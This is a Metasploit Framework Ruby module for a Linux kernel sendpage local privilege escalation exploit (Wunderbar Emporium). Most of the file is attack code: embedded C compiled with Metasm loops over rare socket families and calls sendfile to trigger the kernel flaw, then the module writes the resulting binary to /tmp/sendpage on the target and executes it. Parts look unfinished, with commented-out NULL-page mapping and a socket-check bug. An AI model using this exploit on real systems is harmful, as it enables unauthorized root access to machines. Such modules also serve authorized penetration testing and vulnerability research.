##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

load 'lib/msf/core/exploit/local/unix.rb'
load 'lib/msf/core/exploit/local/linux.rb'
load 'lib/msf/core/exploit/local/linux_kernel.rb'

class Metasploit4 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	include Msf::Exploit::Local::LinuxKernel
	include Msf::Exploit::Local::Linux
	include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'          => 'Linux Kernel Sendpage Local Privilege Escalation',
				'Description'   => %q{
					AKA Wunderbar Emporium
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'spender', # wunderbar_emporium.tgz
						'egypt'    # metasploit module
					],
				'Platform'      => [ 'linux' ],
				'Arch'          => [ ARCH_X86 ],
				'SessionTypes'  => [ 'shell', 'meterpreter' ],
				'Targets'       =>
					[
						[ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
						#[ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ],
					],
				#'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
				'DefaultTarget' => 0,
			}
			))
	end

	def exploit
		sc = Metasm::ELF.new(@cpu)
		cparser.parse "#define DEBUGGING"
		sc.parse %Q|
			#define DEBUGGING
			#ifdef __ELF__
				.section ".text" rwx
				.entrypoint
			#endif
			call main
			push eax
			call exit
		|

		unix_socket_h(sc)
		current_task_struct_h(sc)

		case target.arch.first
		when ARCH_X86
			linux_x86_syscall_wrappers(sc)
			main = <<-EOS
				#define NULL ((void*)0)
				#define PAGE_SIZE (4096)
				#define DOMAINS_STOP -1
				const int domains[] = {
					PF_APPLETALK,
					PF_IPX,
					PF_IRDA,
					PF_X25,
					PF_AX25,
					PF_BLUETOOTH,
					PF_PPPOX,
					DOMAINS_STOP
					};

				int main() {
					int in_fd, out_fd;
					char *addr;
					int d = 0;

					/*
					addr = mmap(
						NULL, 0x1000,
						PROT_EXEC | PROT_READ   | PROT_WRITE,
						MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS,
						0, 0);
					sigtrap();
					if (addr != NULL) {
						#{c_puts("Failed, trying again without PROT_EXEC hoping they don't support NX")}
						addr = mmap(
							NULL, 0x1000,
							PROT_READ | PROT_WRITE,
							MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS,
							0, 0);
						sigtrap();
						if (addr == NULL) {
							#{c_puts("Mapped NULL! ZOMG! Let's fighting love!")}
						} else {
							#{c_puts("Failed to map 0 page")}
						}
					}

					addr[0] = '\\xff';
					addr[1] = '\\x25';
					*(unsigned long *)&addr[2] = 8;
					*(unsigned long *)&addr[8] = (unsigned long)&sigtrap;
					*/

					for (d = 0; domains[d] != DOMAINS_STOP; d++) {
						#{c_puts("Next domain")}
						out_fd = socket(domains[d], SOCK_DGRAM, 0);
						sigtrap();
						if (in_fd > 0) {
							break;
						}
					}

					if (out_fd < 0) {
						#{c_puts("No domains.")}
						exit(1);
					}

					in_fd = open("/tmp/woot", O_CREAT | O_RDWR, 0700);
					unlink("/tmp/woot");

					ftruncate(in_fd, 0);
					#{c_puts("About to trigger")}
					sendfile(in_fd, out_fd, NULL, PAGE_SIZE);
					return 42;
				}
			EOS
			cparser.parse(main)
			asm = cpu.new_ccompiler(cparser, sc).compile

			sc.parse asm
		end

		sc.assemble

		if sc.kind_of? Metasm::ELF
			elf = sc.encode_string
		else
			foo = sc.encode_string
			elf = Msf::Util::EXE.to_linux_x86_elf(framework, foo)
		end

		#puts Rex::Text.to_hex_dump(foo)
		File.open("payload.bin", "wb") {|fd|
			fd.write elf
		}
		write_file("/tmp/sendpage", elf)
		p cmd_exec("chmod +x /tmp/sendpage; /tmp/sendpage")

	end

	def c_puts(str)
		%Q|write(1, "#{str}\\n", #{str.length + 1});|
	end

end
